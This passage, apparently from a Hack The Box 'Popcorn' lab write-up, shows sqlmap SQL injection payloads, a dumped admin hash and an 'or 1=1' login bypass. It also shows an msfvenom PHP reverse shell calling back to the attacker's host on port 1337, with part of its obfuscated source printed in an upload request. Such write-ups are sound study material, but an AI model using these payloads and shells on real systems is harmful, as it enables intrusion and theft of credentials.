    Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=pwnd' AND (SELECT 8745 FROM(SELECT COUNT(*),CONCAT(0x716a786b71,(SELECT (ELT(8745=8745,1))),0x7162716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DGhR&amp;amp;password=pwnd
    Type: time-based blind
    Title: MySQL &amp;lt;= 5.0.11 AND time-based blind (heavy query)
    Payload: username=pwnd' AND 5766=BENCHMARK(5000000,MD5(0x69424279))-- wnNK&amp;amp;password=pwnd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Importantly I get the dB details:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;Database: torrenthoster
[8 tables]
+---------------------------------------+
| ban                                   |
| categories                            |
| comments                              |
| log                                   |
| namemap                               |
| news                                  |
| subcategories                         |
| users                                 |
+---------------------------------------+
Database: information_schema
[28 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| KEY_COLUMN_USAGE                      |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Lets get all the goodies&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://&lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt;/torrent/login.php &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;password=pwnd&amp;amp;username=pwnd&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--method&lt;/span&gt; POST &lt;span class=&quot;nt&quot;&gt;--dbms&lt;/span&gt; MySQL &lt;span class=&quot;nt&quot;&gt;--thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This takes a little while, but eventually from &lt;strong&gt;~/.sqlmap/output/10.10.10.6/dump/torrenthoster/users.csv&lt;/strong&gt; I get the admin account details:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;id,email,joined,userName,password,privilege,lastconnect
3,admin@yourdomain.com,2007-01-06 21:12:46,Admin,d5bfedcee289e5e05b86daad8ee3e2e2,admin,2007-01-06 21:12:46&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Normally at this point I’d fire the password hash &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d5bfedcee289e5e05b86daad8ee3e2e2&lt;/code&gt; through a decrypter but it isn’t nesessary to get logged into the app as admin.&lt;/p&gt;

&lt;p&gt;Because the injection point was in the login and it responded to boolean sqli on the username variable I can try a blind login.&lt;/p&gt;

&lt;p&gt;Now at this point an option a more aggressive option would be to force a shell with sqlmap’s os-shell flag. I’ll admit I tried it but struggled to find a writable directory for the exploit to work.&lt;/p&gt;

&lt;p&gt;Attacking this way isn’t my strong suit, the OSCP certification doesn’t allow autopwn attacks with this tool so I’m not so familiar with the nuance of the approach. I park this vector to go back to and research if I get no where with the SQLi.&lt;/p&gt;

&lt;p&gt;Going to the login page on the site I try the following username:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;Admin&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' or 1=1; #&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And I can put whatever I want as the password (but I do need to put something in this case), in effect (I hope) creating a similar sql statement to the one below&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Admin'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'doesn'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;matter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'m a comment&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This statement will return all the details for all entries of the users table where the username is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Admin&lt;/code&gt; or things are True (1=1). As I just said 1=1 is true SQLi will return the details of the first account in the dB with all its details as the active account to use.&lt;/p&gt;

&lt;p&gt;In fact when I debugged later the sql was:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;privilege&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This works as most logins do, pass the username and the hashed version of the password to the username table.&lt;/p&gt;

&lt;p&gt;If the result is True, i.e. the username and password details in the table match those supplied, give me access details required for the username.&lt;/p&gt;

&lt;p&gt;Because our injection attack in effect becomes:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;privilege&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Admin'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'doesn'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;matter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'m a comment&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We return a True on the query and a pass on the login check. This gives us the first record of the dB by default to use which is usually the root/admin, as it is needed to set up most dBs.&lt;/p&gt;

&lt;p&gt;The result is that this gets me an admin login, evident by the fact I can now view and edit the uploads at http://10.10.10.6/torrent/torrents.php?mode=upload&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/KaliSetup/authenticated.png&quot; alt=&quot;authenticated.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So this is pretty cool I have admin level app control, I can mess with the app as a power user.&lt;/p&gt;

&lt;p&gt;Now that I have a good level of access to the app I return to the exploit code to see if I can use anything. An upload vulnerability potentially allows me to get a reverse shell on the box.&lt;/p&gt;

&lt;p&gt;When I examined the exploit, I can honestly say this stumped me for quite a while.&lt;/p&gt;

&lt;p&gt;I could not really make sense the exploit, the replacement character � (&amp;amp;#65533)  is everywhere and the code makes little sense intially.&lt;/p&gt;

&lt;p&gt;Looking at the source code on the upload page I could see vague similarities to the exploit but nothing concrete. Still, convinced that a file upload could be a possible vector I set up ZAP as an attack proxy on port 8080 with FireFox to record details as I run through the site manually.&lt;/p&gt;

&lt;p&gt;Going to the torrent directory I spy a Kali Linux torrent upload: http://10.10.10.6/torrent/index.php?mode=directory and go to it http://10.10.10.6/torrent/torrents.php?mode=details&amp;amp;id=723bc28f9b6f924cca68ccdff96b6190566ca6b4&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/KaliSetup/kali_torrent.png&quot; alt=&quot;kali_torrent.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Which I can edit:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/KaliSetup/torrent_edit.png&quot; alt=&quot;torrent_edit.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Beginning to suspect that I can edit the image or torrent file via this window, I could force the application to take some code injected into an image or torrent provided the area it renders on the server knows how to execute the code.&lt;/p&gt;

&lt;p&gt;I know I’m dealing with PhP pages, this gives me the language for my payload, now I just have to find a place that will render php content in the uploads.&lt;/p&gt;

&lt;p&gt;Closing down the editor I examine the torrent details and notice the image links out to:
http://10.10.10.6/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.png&lt;/p&gt;

&lt;p&gt;I follow it, but pull one level back to see if we have Directory Listing on http://10.10.10.6/torrent/upload/ which I do:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/KaliSetup/uploads.png&quot; alt=&quot;uploads.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This might work if I can upload a malformed image. The edit specifies this needs to be in an image format and no larger than 100Kb, a little limiting but maybe usable.&lt;/p&gt;

&lt;p&gt;I check the torrent link 10.10.10.6/torrent/torrents.php?mode=download&amp;amp;id=723bc28f9b6f924cca68ccdff96b6190566ca6b4 which in theory could be big, but the url stays in the same page, with the API looking to fetch a resource from an unknown storage location. I’d need the source code to work that out, at this point a malformed image looks like a good option to try.&lt;/p&gt;

&lt;p&gt;First I need a payload, I’m going with a raw reverse shell that will connect back to me on port 1337 in php&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; php/reverse_php &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ATTACK&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1337 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; raw &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This gives me:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 3024 bytes
/*&amp;lt;php&amp;gt;/**/
EXPLOIT&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Under my 100kb, that beats the size requirement. I specify a file to hold my code:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; php/reverse_php &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ATTACK&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1337 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; raw &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; evil.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And try an upload, which returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invalid file&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This is expected as the form specifies the upload must be in image format.&lt;/p&gt;

&lt;p&gt;I go to ZAP to get the details, the Request data from the latest edit page is:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;-----------------------------6880877471789511041406832871
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;evil.php&quot;
Content-Type: application/x-php
    /*&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/**/&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;error_reporting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set_time_limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ignore_user_abort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ini_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'max_execution_time'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ini_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'disable_functions'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/[, ]+/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;array_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'trim'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      
    &lt;span class=&quot;nv&quot;&gt;$ipaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'10.10.14.34'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;function_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'CkLhPZUPboOwI'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CkLhPZUPboOwI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;FALSE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strtolower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;PHP_OS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'win'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; 2&amp;gt;&amp;amp;1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$EPWc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'is_callable'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$JZlmOv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'in_array'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$EPWc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'passthru'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$JZlmOv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'passthru'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;ob_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;passthru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ob_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;ob_end_clean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$EPWc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'exec'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$JZlmOv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'exec'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
